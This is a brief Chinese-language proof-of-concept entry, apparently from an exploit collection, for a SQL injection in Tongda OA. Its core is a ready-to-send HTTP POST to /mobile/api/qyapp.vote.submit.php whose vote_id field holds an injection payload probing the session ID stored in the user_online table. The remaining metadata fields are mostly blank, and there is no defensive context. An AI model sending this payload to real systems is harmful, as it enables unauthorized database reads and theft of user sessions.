﻿# 通达 OA sql注入漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：通达 OA sql注入漏洞

> 漏洞特征：

> 验证脚本：HTTP

```
POST /mobile/api/qyapp.vote.submit.php HTTP/1.1

submitData={"a":{"vote_type":"1","vote_id":"if(length((select SID from user_online limit 0,1))=26,1,2*1e308)","value":"1"}}
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：通达 OA sql注入漏洞.poc
